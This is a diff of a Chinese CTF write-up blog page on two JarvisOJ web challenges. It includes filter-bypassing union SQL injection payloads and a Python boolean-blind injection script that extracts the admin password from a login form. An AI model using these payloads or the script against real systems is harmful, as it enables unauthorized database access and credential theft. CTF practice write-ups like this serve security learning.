+<pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</code></pre><p>看不出有其他异常点，由于含有参数<code>?id=1</code>，故尝试sql注入。发现输入<code>&#39;</code>时回显查询字符串，表名为<code>content</code>，确认考察sql注入。</p>
+<p>1.判断注入类型为数字型注入</p>
+<p>2.查明过滤字符和关键字，经过测试，发现过滤了<code>select</code>、<code>union</code>、<code>from</code>、<code>空格</code>，关键字使用双写、大小写绕过，<code>空格</code>使用/<em>1</em>/绕过。</p>
+<p>3.通过union查询来获得<code>content</code>表的列名：</p>
+<pre><code>?id=-1/*1*/uunionnIon/*1*/seunionleCT/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74%23</code></pre><p><strong><em>这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。</em></strong></p>
+<p>查询结果为：</p>
+<pre><code>id,context,title</code></pre><p>对<code>context</code>列进行查找：</p>
+<pre><code>?id=-1/*1*/uunionnIon/*1*/seunionleCT/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content%23</code></pre><p>查询结果即为flag。</p>
+<h2 id="6-Simple-Injection"><a href="#6-Simple-Injection" class="headerlink" title="6.Simple Injection"></a>6.Simple Injection</h2><p>首先对网站进行目录扫描，未发现其他有价值的页面。着手对登录页面进行注入。</p>
+<p>发现页面会提示用户名错误和密码错误，判断用户名和密码验证为分步进行。</p>
+<p>测试常用用户名，发现合法用户名<code>admin</code>。</p>
+<p>对该用户名进行注入，发现为字符型注入，且闭合符号为<code>&#39;</code>，<code>&#39;||1#</code>可顺利绕过用户名验证。</p>
+<p>对此位置进行基于bool的盲注。</p>
+<pre><code>#!/usr/bin/python3
+# -- coding: utf-8 --
+
+import requests
+import urllib.parse
+
+URL = &quot;http://web.jarvisoj.com:32787/login.php&quot;
+
+# Fuzz
+fObj = open(&quot;/root/Desktop/special_char.txt&quot;, &apos;r&apos;)
+
+for word in fObj.readlines():
+    word_ = word.strip()
+    word = urllib.parse.unquote(word_)
+    parma = {&quot;username&quot;:&quot;&apos;||length(&apos;\\&quot;+ word +&quot;&apos;)=&quot;+ str(len(word)) +&quot;#&quot;, &quot;password&quot;:&quot;1&quot;}
+    post = requests.post(url=URL, data=parma)
+    if post.text.find(&quot;密码错误&quot;) == -1:
+        print(&quot;%s\tFiltered&quot; % word_)
+
+fObj.close()
+
+fObj = open(&quot;/root/Desktop/char_list.txt&quot;, &apos;r&apos;)
+chrList = fObj.readlines()
+fObj.close()
+
+# query = &quot;(database())&quot;
+# query = &quot;(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1)&quot;
+# query = &quot;(select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&apos;admin&apos;/**/limit/**/2,1)&quot;
+# id    username    password
+query = &quot;(select/**/password/**/from/**/admin)&quot;
+
+length = 0
+for l in range(1,100):
+    parma = {&quot;username&quot;:&quot;&apos;||length(&quot;+ query +&quot;)=&quot;+ str(l) +&quot;#&quot;, &quot;password&quot;:&quot;1&quot;}
+    post = requests.post(url=URL, data=parma)
+    if post.text.find(&quot;密码错误&quot;) != -1:
+        length = l
+        break
+print(length)
+
+for l in range(length):
+    flag = False
+    for ch in chrList:
+        ch = ch.strip()
+        parma = {&quot;username&quot;:&quot;&apos;||substr(&quot;+ query +&quot;,&quot;+ str(l+1) +&quot;,1)=&apos;&quot;+ ch +&quot;&apos;#&quot;, &quot;password&quot;:&quot;1&quot;}
+        post = requests.post(url=URL, data=parma)
+        if post.text.find(&quot;密码错误&quot;) != -1:
+            print(ch, end=&apos;&apos;)
+            flag = True
+            break
+    if not flag:
+        print(&quot;*&quot;, end=&apos;&apos;)
+print()</code></pre><p><strong><em>心得：要先对注入点进行测试，判断过滤了哪些特殊字符和关键字，注意对特殊字符进行转义。</em></strong></p>
 <h2 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……"></a>持续更新中……</h2>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 luo_xiao_hei_718@163.com </span>
@@ -470,7 +558,7 @@ else
     
     <p><span class="copy-title">本文作者:</span><a  title="Rock">Rock</a></p>
     <p><span class="copy-title">发布时间:</span>2019-12-24, 20:30:19</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-04, 19:17:54</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-26, 21:14:10</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/24/jarvisoj-web-wp/" title="jarvisoj web 题目解答">https://rock718.github.io.git/2019/12/24/jarvisoj-web-wp/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -515,7 +603,7 @@ else
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#ctf','#misc','#writeup','#python','#web','#xctf','#xss','#image','#png','#code','#vpn','#sqli','#hexo',],
+            'data': ['#ctf','#misc','#writeup','#web','#xctf','#python','#xss','#image','#png','#code','#vpn','#sqli','#hexo',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
